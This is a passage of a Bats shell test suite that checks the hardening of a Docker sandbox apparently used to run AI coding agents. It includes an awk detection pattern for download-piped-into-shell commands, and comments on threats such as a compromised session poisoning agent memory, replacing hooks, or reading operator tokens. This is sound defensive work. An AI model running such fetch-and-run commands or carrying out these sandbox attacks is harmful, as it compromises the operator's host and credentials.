            cat "$BATS_TEST_TMPDIR/seen-args"
        ' -- /dev/null "$BATS_TEST_TMPDIR/echoargs" 2>/dev/null || true
    # Driven directly rather than through run_fetch, which pins the header empty.
    STUB_DIR="$BATS_TEST_TMPDIR/stub2"; mkdir -p "$STUB_DIR"
    cp "$BATS_TEST_TMPDIR/echoargs" "$STUB_DIR/curl"; chmod +x "$STUB_DIR/curl"
    (
        PATH="$STUB_DIR:$PATH"
        sleep() { :; }
        say() { :; }
        die() { exit 1; }
        FORGE_META_URL="https://forge.example/meta"
        FORGE_META_FILTER='[.git[]?, .api[]?, .web[]?] | unique | .[]'
        FORGE_META_AUTH="Authorization: Bearer probe-token"
        FETCH_ATTEMPTS=1
        FETCH_TIMEOUT=5
        eval "$(sed -n '/^fetch_forge_ranges()/,/^}/p' "$SANDBOX_DIR/egress-policy")"
        fetch_forge_ranges "$BATS_TEST_TMPDIR/meta2"
    )
    grep -q 'Authorization: Bearer probe-token' "$BATS_TEST_TMPDIR/seen-args" \
        || { echo "the credential never reached curl: $(cat "$BATS_TEST_TMPDIR/seen-args")" >&2; false; }
}

@test "no build step pipes a download straight into a shell" {
    # `sh -c "$(wget -O- ...)"` is the form every install-script README
    # documents, and in it a failed download substitutes to an empty string,
    # `sh -c ""` exits 0, and the build goes green having installed nothing -
    # the kind of failure that only surfaces later, as something inexplicably
    # unconfigured. It is also the shape that makes a build-time fetch
    # unreviewable, which is why nothing in this image does it at all any more.
    local substituted
    substituted=$(awk '
        /^[[:space:]]*#/ { next }
        /sh -c "\$\((wget|curl)/ || /(wget|curl)[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(sh|bash)([[:space:]]|$)/ { print FNR": "$0 }
    ' "$SANDBOX_DIR/Dockerfile")
    [ -z "$substituted" ] || {
        echo "a download is being executed directly, so a failed one installs nothing and exits 0:" >&2
        echo "$substituted" >&2
        false
    }
}

@test "the session shell is configured by this repo, not by a fetched installer" {
    # The configuration is a file here, so shellcheck covers it and a reader
    # can see what their shell does - neither of which is true of a release
    # tarball downloaded during the build and executed.
    [ -f "$SANDBOX_DIR/session-bashrc.sh" ] \
        || { echo "docker/session-bashrc.sh is gone; what configures the shell now?"; return 1; }
    grep -qE '^\s*ENV SHELL=/bin/bash$' "$SANDBOX_DIR/Dockerfile" \
        || { echo "SHELL no longer names the shell session-bashrc.sh is written for"; return 1; }
    grep -q 'COPY docker/session-bashrc.sh' "$SANDBOX_DIR/Dockerfile" \
        || { echo "session-bashrc.sh is not copied into the image, so nothing sources it"; return 1; }
    # Sourced from both places on purpose: /etc/bash.bashrc covers every
    # interactive shell, and the user's own rc file is what makes this win over
    # the Debian skeleton, which resets PS1 and the history limits after it.
    grep -q 'bash.bashrc.d' "$SANDBOX_DIR/Dockerfile" \
        || { echo "nothing sources the snippet directory from /etc/bash.bashrc"; return 1; }
    grep -q '10-session.bash' "$SANDBOX_DIR/Dockerfile" \
        || { echo "the sandbox user's .bashrc does not source the snippet"; return 1; }
}

@test "history is written per command, onto the volume that persists it" {
    # A sandbox session is killed far more often than it exits, and bash writes
    # history on a clean exit only. Without the append there is no record of
    # what a session did, which is the case the record exists for.
    local rc="$SANDBOX_DIR/session-bashrc.sh"
    grep -q "PROMPT_COMMAND='history -a'" "$rc" \
        || { echo "history is not appended per command, so a killed session loses it"; return 1; }
    grep -q 'HISTFILE=/var/opt/shell-history/' "$rc" \
        || { echo "HISTFILE does not point at the persisted volume"; return 1; }
    grep -q 'dejima-bashhistory:/var/opt/shell-history' "$SANDBOX_DIR/docker-compose.yml" \
        || { echo "the history volume is not mounted where HISTFILE points"; return 1; }
}

@test "root's interactive shell takes no history file from the session user's volume" {
    # /etc/bash.bashrc sources this snippet for every interactive bash, so an
    # operator attaching as root gets it too - and the volume it would point
    # HISTFILE at belongs to the sandbox user. `history -a` follows a symlink,
    # so the session could aim root's history at any file and have root append
    # to it; and whatever the operator typed, tokens included, would be readable
    # by the agent.
    #
    # Run rather than grepped, with `id` stubbed, because what matters is the
    # value HISTFILE ends up holding and not which line decided it.
    local rc="$SANDBOX_DIR/session-bashrc.sh" stub="$BATS_TEST_TMPDIR/stub"
    mkdir -p "$stub"

    printf '#!/bin/sh\necho 0\n' > "$stub/id"
    chmod +x "$stub/id"
    run env PATH="$stub:$PATH" bash -ic "HISTFILE=UNSET; . '$rc'; printf '%s' \"\$HISTFILE\""
    [ "$status" -eq 0 ] || { echo "sourcing the rc as root failed: $output"; return 1; }
    [[ "$output" == *UNSET* ]] \
        || { echo "root's HISTFILE was reassigned to: $output"; return 1; }

    # The same file still configures the account it is written for. Asserted
    # because the guard above is one `id` away from disabling the whole snippet.
    printf '#!/bin/sh\necho 1000\n' > "$stub/id"
    run env PATH="$stub:$PATH" bash -ic "HISTFILE=UNSET; . '$rc'; printf '%s' \"\$HISTFILE\""
    [ "$status" -eq 0 ] || { echo "sourcing the rc as the sandbox user failed: $output"; return 1; }
    [[ "$output" != *UNSET* ]] \
        || { echo "the sandbox user's HISTFILE was left unset, so the guard is too broad"; return 1; }
}

# True when a Dockerfile RUN line INVOKES the sweeper, rather than merely
# mentioning its path. `chmod +x /usr/local/sbin/strip-privilege-bits` contains
# the path and runs nothing, and so does a commented-out line - both of which
# satisfied a substring grep, so the sweep could be disabled with its test green.
_runs_sweeper() {  # <a RUN line, with or without a "N:" prefix>
    local line="${1#*:}" seg
    case "$line" in RUN\ *) line="${line#RUN }" ;; *) return 1 ;; esac
    while IFS= read -r seg; do
        seg="${seg#"${seg%%[![:space:]]*}"}"
        case "$seg" in
            /usr/local/sbin/strip-privilege-bits|/usr/local/sbin/strip-privilege-bits\ *) return 0 ;;
        esac
    done < <(printf '%s\n' "$line" | tr ';' '\n' | sed 's/&&/\n/g')
    return 1
}

@test "the image sweeps its privilege bits last, and a derived layer sweeps again" {
    # The sweep only covers what exists when it runs, so the base image's copy
    # has to be the last thing that changes the filesystem, and the derived
    # per-project layer - which installs apt/pip/tarball dependencies after the
    # base image is finished - has to run it again at its own end.
    #
    # With the sweep disabled the image ships Debian's setuid set - su, mount,
    # passwd, chsh, ssh-keysign, unix_chkpwd - with no_new_privs as the only
    # remaining lock, which strip-privilege-bits.sh's own header declines to
    # rely on. So this asserts the invocation, not the spelling.
    local dockerfile="$SANDBOX_DIR/Dockerfile" last
    [ -f "$SANDBOX_DIR/strip-privilege-bits.sh" ] \
        || { echo "docker/strip-privilege-bits.sh is gone"; return 1; }
    last=$(grep -nE '^(RUN|COPY|ADD) ' "$dockerfile" | tail -1)
    _runs_sweeper "$last" \
        || { echo "the last instruction does not run the sweep: $last"; return 1; }

    # The derived layer, generated and read rather than grepped: the order is
    # the whole property and the generator is what decides it.
    local df store="$BATS_TEST_TMPDIR/store"
    mkdir -p "$store"
    printf 'apt:cowsay\n' > "$store/dependencies"
    df=$(bash -c 'source "$1"; generate_derived_dockerfile "$2" "$3"' \
            _ "$REPO_ROOT/bin/dejima-project-lib.sh" localhost/base:test "$store") \
        || { echo "could not generate a derived Dockerfile"; return 1; }

    local n sweep_at=0 install_at=0 line
    n=0
    while IFS= read -r line; do
        n=$((n + 1))
        case "$line" in RUN\ *) ;; *) continue ;; esac
        if _runs_sweeper "$line"; then sweep_at=$n; else install_at=$n; fi
    done <<< "$df"

    [ "$sweep_at" -gt 0 ] \
        || { echo "a derived project layer installs packages and never sweeps them:"; echo "$df"; return 1; }
    [ "$sweep_at" -gt "$install_at" ] \
        || { echo "the derived layer sweeps before its last install:"; echo "$df"; return 1; }
}

@test "docker-compose.yml runs an init so orphaned processes get reaped" {
    # Without this the session's own command is PID 1 and never reaps, so
    # leaked children accumulate as zombies until the pids cgroup is full
    # and the container cannot fork - see the comment on the init: line.
    grep -qE '^\s*init:\s*true\s*$' "$SANDBOX_DIR/docker-compose.yml"
}

@test "docker-compose.yml never mounts the Docker socket" {
    run grep -i "docker.sock" "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ]
}

@test "docker-compose.yml never mounts host SSH/cloud credential directories" {
    # Anchored to the *source* side of a mount (right after the leading
    # "- ") - the container's own $HOME legitimately contains .ssh/known_hosts
    # as a *destination* path now that it mirrors the host's $HOME, which
    # isn't the same thing as mounting the host's real ~/.ssh directory in.
    run grep -E '^\s*-\s*\$\{HOME\}/\.(ssh|aws|gcloud|azure)(/|:)' "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ]
}

@test "~/.claude is not mounted as a whole - its contents are enumerated" {
    # It used to be, read-write, with the config inside it layered back
    # read-only on top. Every one of those overlays was a mount point nested
    # inside a host-writable mount, and a single-file bind mount is pinned to
    # the dentry at that path: a host-side rename unlinks it, the mount
    # silently detaches, and the path falls through to the real writable host
    # file (#47, #48). The mask over .credentials.json went the same way,
    # handing the sandbox the operator's real OAuth token (#50). With no
    # parent mount, a detachment falls through to container-local emptiness.
    run grep -E '^\s*-\s*\$\{HOME\}/\.claude:\$\{HOME\}/\.claude\s*$' "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ]
    run grep -E '^\s*-\s*\$\{HOME\}/\.claude/\.credentials' "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ]
}

# Whether the selected harness declares a directory its image layer creates.
# The requirement each of the callers below describes is unchanged; what moved
# is where it is satisfied. The base image is shared by every harness, so a
# directory only one of them needs is declared by that one - see `image_dirs`
# in docs/providers.md.
_harness_declares_file() {
    local want="$1" files f
    files="$(bash -c 'source "$1"; manifest_get harness claude-code image_files' _ \
        "$REPO_ROOT/bin/dejima-provider-lib.sh")" || return 1
    for f in $files; do [ "$f" = "$want" ] && return 0; done
    return 1
}

_harness_declares_dir() {
    local want="$1" dirs d
    dirs="$(bash -c 'source "$1"; manifest_get harness claude-code image_dirs' _ \
        "$REPO_ROOT/bin/dejima-provider-lib.sh")" || return 1
    for d in $dirs; do [ "$d" = "$want" ] && return 0; done
    return 1
}

@test "the image bakes in a user-owned ~/.claude for the enumerated mounts to land in" {
    # Nothing mounts the directory itself, so it has to exist and be writable
    # by the sandbox user - otherwise Docker auto-creates it root-owned while
    # setting up the mounts nested under it, and the session cannot write its
    # own cache or the config entrypoint.sh copies in.
    _harness_declares_dir .claude \
        || { echo "the harness does not declare ~/.claude"; return 1; }
    # And the layer that reads the declaration makes it user-owned, which is
    # the half a declaration alone would not give.
    run bash -c 'source "$1"; generate_spec_dockerfile base "" ".claude" ""' _ \
        "$REPO_ROOT/bin/dejima-project-lib.sh"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *'chown -R ${SANDBOX_USER}:${SANDBOX_USER}'* ]] || { echo "$output"; return 1; }
}


# The config directories the selected harness declares, as "path<TAB>mode<TAB>scan"
# lines. Runs the hook rather than grepping the plugin, so these assert what a
# launch would actually mount.
# The seed destinations the harness declares, one per line. Against a fixture
# HOME rather than the operator's, so the set does not depend on which plugins
# happen to be installed on the machine running the tests - except where a test
# says otherwise.
_declared_seeds() {
    local home="${1:-$PLUGIN_FIXTURE_HOME}"
    bash -c '
        source "'"$REPO_ROOT"'/bin/dejima-provider-lib.sh"
        source "'"$REPO_ROOT"'/bin/dejima-harness-lib.sh"
        HOME="'"$home"'"
        harness_plugin_load claude-code
        harness_seed_load
        for r in ${DEJIMA_SEED[@]+"${DEJIMA_SEED[@]}"}; do
            printf "%s\n" "${r%%$'"'"'\t'"'"'*}"
        done
    '
}

# The read-only mounts the harness emits for installed plugin versions.
_declared_plugin_mounts() {
    local home="${1:-$PLUGIN_FIXTURE_HOME}"
    bash -c '
        source "'"$REPO_ROOT"'/bin/dejima-provider-lib.sh"
        source "'"$REPO_ROOT"'/bin/dejima-harness-lib.sh"
        HOME="'"$home"'"
        harness_plugin_load claude-code
        extra_mounts=()
        _guarded_stores() { GUARDED_STORES=(); }
        _plugin_version_mounts
        printf "%s\n" ${extra_mounts[@]+"${extra_mounts[@]}"} | grep -v "^-v$"
    '
}

# A plugin tree shaped like a real one: a marketplace, two plugins, and two
# installed versions of one of them - which is what an update looks like
# mid-flight, and the case the whole arrangement exists for.
_plugin_fixture() {
    PLUGIN_FIXTURE_HOME="$(mktemp -d "$BATS_TEST_TMPDIR/plughome.XXXXXX")"
    local p="$PLUGIN_FIXTURE_HOME/.claude/plugins"
    mkdir -p "$p/marketplaces/mkt" "$p/data/thing" \
        "$p/cache/mkt/alpha/1.0.0" "$p/cache/mkt/alpha/1.1.0" "$p/cache/mkt/beta/2.0.0"
    printf '{}\n' > "$p/installed_plugins.json"
    printf '{}\n' > "$p/known_marketplaces.json"
    printf '{}\n' > "$p/plugin-catalog-cache.json"
}

# The same three declarations, for whichever harness is asked about. cline's
# are new and claude-code's are long-standing, and a helper per harness would
# drift. A nameref rather than eval: the array name is the only thing that
# varies, and quoting it through two shells is how the first version of this
# printed a literal "n" for every newline.
_declared_for() {  # <harness> <loader> <array-name>
    bash -c '
        source "'"$REPO_ROOT"'/bin/dejima-provider-lib.sh"
        source "'"$REPO_ROOT"'/bin/dejima-harness-lib.sh"
        HOME=/h
        harness_plugin_load "$1"
        "$2"
        declare -n _arr="$3"
        printf "%s\n" ${_arr[@]+"${_arr[@]}"}
    ' _ "$1" "$2" "$3"
}

# The same, against a real home. emit_seed_from skips a source that does not
# exist - a fresh install has none of this state - so a seed assertion needs
# files on disk rather than the /h placeholder above.
_declared_for_home() {  # <home> <harness> <loader> <array-name>
    bash -c '
        source "'"$REPO_ROOT"'/bin/dejima-provider-lib.sh"
        source "'"$REPO_ROOT"'/bin/dejima-harness-lib.sh"
        HOME="$1"
        harness_plugin_load "$2"
        "$3"
        declare -n _arr="$4"
        printf "%s\n" ${_arr[@]+"${_arr[@]}"}
    ' _ "$1" "$2" "$3" "$4"
}

_declared_config_dirs() {
    bash -c '
        source "'"$REPO_ROOT"'/bin/dejima-provider-lib.sh"
        source "'"$REPO_ROOT"'/bin/dejima-harness-lib.sh"
        HOME=/h
        harness_plugin_load claude-code
        harness_config_dirs_load
        printf "%s\n" ${DEJIMA_CONFIG_DIRS[@]+"${DEJIMA_CONFIG_DIRS[@]}"}
    '
}
@test "~/.claude runtime state that has to survive the session is mounted read-write" {
    # Directories, which is what makes them safe: a directory bind mount
    # can't detach the way a file one does, because a rename replaces an
    # entry *within* the mounted directory rather than the mount point.
    # projects/ and file-history/ are not in this list: both are mounted an
    # entry at a time by bin/dejima, see the tests below. The rest is the
    # task/plan state skills write and the ~/.claude.json backups.
    local dirs d
    dirs="$(_declared_config_dirs)"
    for d in backups tasks plans sessions; do
        grep -qxF "/h/.claude/$d"$'\t'$'\t' <<< "$dirs" \
            || { echo "$d is not declared read-write: $dirs"; return 1; }
    done
}

# The whole tree carries every project's transcripts and agent memory, and
# memory is loaded into context at session start - so write access to it is
# enough to plant text a future session in another project reads as
# background (#104). This is the assertion that the tree itself never comes
# back; the per-slug mounts that replace it are covered below.
# The service still refers to the static keys; only the volume Docker
# actually creates varies, so a hardcoded name here would silently put every
# project back on one shared set.
@test "the nvim volumes take their names from the environment" {
    grep -qE '^\s*name:\s*\$\{SANDBOX_NVIM_DATA:-' "$SANDBOX_DIR/docker-compose.yml"
    grep -qE '^\s*name:\s*\$\{SANDBOX_NVIM_STATE:-' "$SANDBOX_DIR/docker-compose.yml"
    grep -qE '^\s*name:\s*\$\{SANDBOX_NVIM_CACHE:-' "$SANDBOX_DIR/docker-compose.yml"
    grep -q 'export SANDBOX_NVIM_DATA=' "$REPO_ROOT/bin/dejima"
}

@test "docker-compose.yml never mounts the whole ~/.claude/projects tree" {
    run grep -nE '^\s*-\s*\$\{HOME\}/\.claude/projects:' "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ] || {
        echo "the projects tree is mounted whole again:" >&2
        echo "$output" >&2
        false
    }
}

@test "the claude-code plugin mounts projects/ one slug at a time" {
    # Moved out of bin/dejima into the harness plugin: which directories a
    # harness keeps, and what decides an entry belongs to this workspace, is
    # a fact about the harness. The property is unchanged - the tree is
    # every project's transcripts and memory, and memory is read into
    # context at session start (#104).
    local p="$REPO_ROOT/bin/harness/claude-code.sh"
    grep -q 'workspace_slugs_sorted "$ws"' "$p"
    grep -q 'emit_mount "$projects/$slug"' "$p"
}

# Docker creates the parents of a mount point root-owned when they do not
# already exist. projects/ is now such a parent, so without this the session
# could not create a slug of its own - which is exactly what it must do when
# the workspace has no history yet.
@test "the image pre-creates ~/.claude/projects so the slug mounts have a writable parent" {
    _harness_declares_dir .claude/projects \
        || { echo "the harness does not declare ~/.claude/projects"; return 1; }
}

# Each file-history/<session>/<hash>@v1 is a verbatim copy of an edited file,
# so mounting the tree hands a session every project's source outright -
# worse than the transcripts, which are a record about the work rather than
# the work. Writable too, so tampering with another project's undo record
# puts chosen content into a later restore there.
@test "docker-compose.yml never mounts the whole ~/.claude/file-history tree" {
    run grep -nE '^\s*-\s*\$\{HOME\}/\.claude/file-history:' "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ] || {
        echo "the file-history tree is mounted whole again:" >&2
        echo "$output" >&2
        false
    }
}

@test "the claude-code plugin mounts file-history one session at a time" {
    local p="$REPO_ROOT/bin/harness/claude-code.sh"
    grep -q 'workspace_session_ids "$projects" "$ws"' "$p"
    grep -q 'emit_mount "$history/$sid"' "$p"
}

@test "the image pre-creates ~/.claude/file-history so the session mounts have a writable parent" {
    _harness_declares_dir .claude/file-history \
        || { echo "the harness does not declare ~/.claude/file-history"; return 1; }
}

# One definition of "this workspace's slugs", shared by the mount and the
# audit. If they drift, a slug the mount exposes but the audit calls foreign
# fires a finding every session, and a slug the audit calls its own but the
# mount does not expose is a hole nothing reports.
@test "bin/dejima and bin/dejima-audit share one slug definition" {
    grep -q 'source "$SCRIPT_DIR/dejima-slug-lib.sh"' "$REPO_ROOT/bin/dejima"
    grep -q 'dejima-slug-lib.sh"$' "$REPO_ROOT/bin/dejima-audit"
    # and neither keeps a private copy of the sed scheme
    run grep -n "s/\[^a-zA-Z0-9\]/-/g" "$REPO_ROOT/bin/dejima" "$REPO_ROOT/bin/dejima-audit"
    [ "$status" -ne 0 ] || {
        echo "an inline copy of the slug scheme is back:" >&2
        echo "$output" >&2
        false
    }
}

@test "~/.claude config files are staged for copying, not mounted at their real paths" {
    # A copy can't be detached by a host-side rename at all. entrypoint.sh
    # installs them root-owned and read-only; see its comment and the mount
    # inventory in docker-compose.yml.
    # Declared by the harness now, since which files these are is its own.
    local staged
    staged="$(bash -c '
        source "'"$REPO_ROOT"'/bin/dejima-provider-lib.sh"
        source "'"$REPO_ROOT"'/bin/dejima-harness-lib.sh"
        HOME=/h
        harness_plugin_load claude-code
        harness_staged_config_load
        printf "%s\n" ${DEJIMA_STAGED_CONFIG[@]+"${DEJIMA_STAGED_CONFIG[@]}"}
    ')"
    local f
    for f in settings.json CLAUDE.md statusline.sh; do
        grep -qE "^/h/\.claude/$f"$'\t'"\.claude/$f("$'\t'"|$)" <<< "$staged" \
            || { echo "$f is not staged: $staged"; return 1; }
    done
    # And never mounted at their real paths, which is the property staging
    # exists for: a single-file mount detaches on a host-side rename.
    run grep -E '^\s*-\s*\$\{HOME\}/\.claude/(settings\.json|CLAUDE\.md|statusline\.sh):\$\{HOME\}/' "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ]
    # The staging tree mirrors the destination, so entrypoint.sh names no
    # harness's paths - it installs <rel> at $SANDBOX_HOME/<rel>.
    grep -q 'rel="${staged#/etc/dejima-harness/}"' "$SANDBOX_DIR/entrypoint.sh"
    grep -q 'dest="$SANDBOX_HOME/$rel"' "$SANDBOX_DIR/entrypoint.sh"
    run grep -n 'dejima-claude' "$SANDBOX_DIR/entrypoint.sh"
    [ "$status" -ne 0 ] || { echo "entrypoint still names a harness path"; return 1; }
}

@test "~/.claude/hooks is mounted read-only" {
    # Hooks run automatically with no approval gate - see docker-compose.yml's
    # comment on these mount lines. Without this, a compromised session can
    # unlink a hook symlink and drop a plain malicious file in its place,
    # which the dynamic-mount logic in bin/dejima never sees (it only protects
    # symlink targets that resolve outside ~/.claude).
    local dirs
    dirs="$(_declared_config_dirs)"
    grep -q "^/h/.claude/hooks"$'\t'"ro" <<< "$dirs" || { echo "$dirs"; return 1; }
}

@test "the plugin tree is not mounted read-only wholesale" {
    # It was, with the rest of the directories holding something executable,
    # and that broke plugin updates without protecting anything. Claude Code
    # materialises a new version beside the old and rewrites its registry;
    # read-only it can do neither, and the plugin is left at a version the
    # catalogue no longer matches. A copy has no path to the host, which is
    # what the read-only mount was for.
    local dirs
    dirs="$(_declared_config_dirs)"
    grep -q "^/h/.claude/plugins"$'\t' <<< "$dirs" \
        && { echo "the plugin tree is still a config-dir mount: $dirs"; return 1; }
    return 0
}

@test "what the harness rewrites in the plugin tree is seeded writable" {
    _plugin_fixture
    # The registry, the catalogue and the marketplace checkout: all rewritten
    # by Claude Code as it installs or refreshes, none of them useful to the
    # session read-only.
    local seeds
    seeds="$(_declared_seeds)"
    local rel
    for rel in .claude/plugins/installed_plugins.json \
               .claude/plugins/known_marketplaces.json \
               .claude/plugins/plugin-catalog-cache.json \
               .claude/plugins/marketplaces; do
        grep -qx "$rel" <<< "$seeds" || { echo "$rel is not seeded: $seeds"; return 1; }
    done
}

@test "the levels above an installed plugin version are seeded as writable directories" {
    _plugin_fixture
    # Docker creates a bind mount's missing parents as root, so mounting each
    # version without this leaves the session able to read every installed one
    # and write no new one beside them - which is the whole failure.
    local seeds
    seeds="$(_declared_seeds)"
    grep -qx '.claude/plugins/cache' <<< "$seeds" \
        || { echo "the cache root is not seeded: $seeds"; return 1; }
    grep -qE '^\.claude/plugins/cache/[^/]+/[^/]+$' <<< "$seeds" \
        || { echo "no per-plugin cache directory is seeded: $seeds"; return 1; }
}

@test "an installed plugin version is mounted read-only, not copied" {
    _plugin_fixture
    # One MCP server's node_modules is most of the tree. An update writes a
    # NEW version directory rather than changing an existing one, which is
    # what makes mounting these safe and copying them wasteful.
    local mounts
    mounts="$(_declared_plugin_mounts)"
    [ -n "$mounts" ] || skip "no installed plugin versions on this host to assert against"
    grep -qE ':ro$' <<< "$mounts" \
        || { echo "a version directory is mounted writable: $mounts"; return 1; }
    grep -qE '/\.claude/plugins/cache/[^/]+/[^/]+/[^/:]+:' <<< "$mounts" \
        || { echo "not mounted at version granularity: $mounts"; return 1; }
}

@test "~/.claude.json is a throwaway per-session copy, not the real file mounted directly" {
    # A plain read-only mount hangs Claude Code on startup (it does an
    # atomic write-temp-then-rename against this file even before login) -
    # the fix is a generated, discarded copy, not read-only. See
    # bin/dejima and README "Throwaway ~/.claude.json".
    grep -qE '^\s*-\s*\$\{SANDBOX_CLAUDE_JSON_FILE.*\}:\$\{HOME\}/\.claude\.json\s*$' "$SANDBOX_DIR/docker-compose.yml"
    grep -q 'mktemp.*dejima-claude-json' "$REPO_ROOT/bin/dejima"
    grep -q 'rm -f "\$SANDBOX_SETTINGS_FILE" "\$SANDBOX_CLAUDE_JSON_FILE"' "$REPO_ROOT/bin/dejima"
}

@test "gitconfig is a throwaway copy in its own directory, not a single-file mount" {
    # entrypoint.sh's `gh auth setup-git` writes a credential-helper entry
    # via git's write-temp-then-rename pattern, which fails with "Device or
    # resource busy" on a single-file bind mount at ~/.gitconfig directly -
    # a real regression this guards against (Linux won't let a bind mount's
    # backing inode be replaced, only a file *within* a mounted directory
    # can be freely renamed over). Must be a directory mount, with
    # GIT_CONFIG_GLOBAL pointing git at the file inside it.
    grep -qE '^\s*-\s*\$\{SANDBOX_GITCONFIG_DIR.*\}:\$\{HOME\}/\.gitconfig-sandbox\s*$' "$SANDBOX_DIR/docker-compose.yml"
    grep -qE '^\s*GIT_CONFIG_GLOBAL:\s*\$\{HOME\}/\.gitconfig-sandbox/\.gitconfig\s*$' "$SANDBOX_DIR/docker-compose.yml"
    grep -q 'mktemp -d.*gitconfig' "$REPO_ROOT/bin/dejima"
}

@test "every name cleanup() dereferences is bound by the time the EXIT trap can fire" {
    # bin/dejima runs under `set -u`, and a failing command in an EXIT trap
    # replaces the shell's exit status - so an unbound name in cleanup()
    # aborts the trap partway, before it reaches the audit that is
    # deliberately its last act. Structural, not behavioral: the window
    # between `trap cleanup EXIT` and a later assignment holds only comments
    # today, so nothing can currently exit inside it (a failed `VAR="$(...)"`
    # still binds VAR to the empty string before set -e fires). This guards
    # the invariant against the edit that puts something exitable there.
    #
    # A name is satisfied by EITHER a first assignment above the trap OR a
    # `${NAME:-}` form somewhere in cleanup() - the latter covers the bare
    # uses that sit inside their own `[ -n "${NAME:-}" ]` guard.
    d="$REPO_ROOT/bin/dejima"
    trap_line="$(grep -n '^trap cleanup EXIT' "$d" | cut -d: -f1)"
    [ -n "$trap_line" ]
    body="$(sed -n '/^cleanup() {/,/^}/p' "$d")"
    [ -n "$body" ]
    for v in $(printf '%s\n' "$body" | grep -oE '\$\{?[A-Za-z_][A-Za-z0-9_]*\}?' \
                   | tr -d '${}' | sort -u); do
        printf '%s\n' "$body" | grep -q "\${$v:-" && continue
        asg="$(grep -nE "^[[:space:]]*(export )?$v=" "$d" | head -1 | cut -d: -f1)"
        [ -n "$asg" ] || { echo "cleanup() uses \$$v, never assigned at all"; false; }
        [ "$asg" -lt "$trap_line" ] \
            || { echo "cleanup() uses \$$v unguarded, first assigned at line $asg, after the trap at $trap_line"; false; }
    done
}

@test "every path cleanup() removes is one dejima bound, never one the environment did" {
    # A different invariant from the test above, and the `${NAME:-}` form that
    # satisfies that one is no help here. Guarding against UNBOUND stops set -u
    # aborting the trap; it does nothing about a name that arrives from the
    # caller's environment already carrying a value, which the trap then
    # removes. bin/dejima's own comment states this - "every name cleanup()
    # removes but does not itself create belongs here" - and until the run-id
    # change nothing checked it, so three names had drifted out of it, one of
    # them an `rm -rf` argument.
    #
    # An exit between the trap and a name's first assignment is what makes it
    # reachable. SANDBOX_GITCONFIG_DIR is the one name assigned below the trap,
    # and its window holds no exit; anything else below the trap is a finding.
    local d="$REPO_ROOT/bin/dejima"
    local trap_line; trap_line="$(grep -n '^trap cleanup EXIT' "$d" | cut -d: -f1)"
    [ -n "$trap_line" ]

    # Only the rm lines, and only their arguments - cleanup() reads plenty it
    # never deletes, and those are the other test's business.
    local removed
    removed="$(sed -n '/^cleanup() {/,/^}/p' "$d" \
        | grep -E '^[[:space:]]*rm -' \
        | grep -oE '\$\{?[A-Za-z_][A-Za-z0-9_]*' | tr -d '${' | sort -u)"
    [ -n "$removed" ] || { echo "found no rm arguments in cleanup() at all"; return 1; }

    local v asg
    for v in $removed; do
        [ "$v" != "SANDBOX_GITCONFIG_DIR" ] || continue
        asg="$(grep -nE "^[[:space:]]*(export )?$v=" "$d" | head -1 | cut -d: -f1)"
        [ -n "$asg" ] || { echo "cleanup() removes \$$v, which is never assigned"; return 1; }
        [ "$asg" -lt "$trap_line" ] || {
            echo "cleanup() removes \$$v, first assigned at line $asg - below the trap at"
            echo "$trap_line, so an exit in between removes whatever the environment held."
            return 1
        }
    done
}

@test "the one name assigned below the trap still has no exit to fire on" {
    # SANDBOX_GITCONFIG_DIR is exempted above on a claim about its window, not
    # on a claim about the name. The claim is what needs checking: an `exit`
    # appearing between the trap and that assignment turns the exemption into
    # the bug it is exempted from, and nothing about that edit would look like
    # it touched this.
    local d="$REPO_ROOT/bin/dejima"
    local trap_line asg
    trap_line="$(grep -n '^trap cleanup EXIT' "$d" | cut -d: -f1)"
    asg="$(grep -nE '^[[:space:]]*SANDBOX_GITCONFIG_DIR=' "$d" | head -1 | cut -d: -f1)"
    [ -n "$trap_line" ] && [ -n "$asg" ]
    [ "$asg" -gt "$trap_line" ] \
        || skip "SANDBOX_GITCONFIG_DIR is now assigned above the trap; drop the exception"

    run awk -v a="$trap_line" -v b="$asg" 'NR>a && NR<b && /^[[:space:]]*exit [0-9]/ {print NR": "$0}' "$d"
    [ -z "$output" ] || {
        echo "an exit now sits between the trap at $trap_line and the assignment at $asg:"
        echo "$output"
        echo "so bind SANDBOX_GITCONFIG_DIR above the trap like the rest."
        return 1
    }
}

@test "docker-compose.yml never hardcodes /home/node - the container home is host-parametrized" {
    # ${HOME:-/home/node} (the SANDBOX_HOME build arg's own default value,
    # mirroring the Dockerfile's default) is the one legitimate exception -
    # it's a fallback expression, not a hardcoded container path.
    run bash -c "grep -v '^\s*#' '$SANDBOX_DIR/docker-compose.yml' | grep -v '\${HOME:-/home/node}' | grep '/home/node'"
    [ "$status" -ne 0 ]
}

@test "docker-compose.yml builds with a per-user image tag and passes the host identity as build args" {
    grep -qE '^\s*image:\s*\$\{SANDBOX_IMAGE:-localhost/dejima:\$\{SANDBOX_USER:-node\}\}\s*$' "$SANDBOX_DIR/docker-compose.yml"
    grep -qE '^\s*SANDBOX_USER:\s*\$\{SANDBOX_USER:-node\}\s*$' "$SANDBOX_DIR/docker-compose.yml"
    grep -qE '^\s*SANDBOX_UID:\s*\$\{SANDBOX_UID:-1000\}\s*$' "$SANDBOX_DIR/docker-compose.yml"
    grep -qE '^\s*SANDBOX_GID:\s*\$\{SANDBOX_GID:-1000\}\s*$' "$SANDBOX_DIR/docker-compose.yml"
    grep -qE '^\s*SANDBOX_HOME:\s*\$\{HOME:-/home/node\}\s*$' "$SANDBOX_DIR/docker-compose.yml"
}

@test "bin/dejima exports the host user identity for the build" {
    grep -q 'SANDBOX_USER="$(id -un)"' "$REPO_ROOT/bin/dejima"
    grep -q 'SANDBOX_UID="$(id -u)"' "$REPO_ROOT/bin/dejima"
    grep -q 'SANDBOX_GID="$(id -g)"' "$REPO_ROOT/bin/dejima"
}

@test "docker-compose.yml never hardcodes a dotfiles (or any other specific repo) mount" {
    # Hook-symlink targets are discovered dynamically at launch by
    # bin/dejima instead - see the next test. A hardcoded path here
    # would silently break for anyone whose hooks live somewhere else.
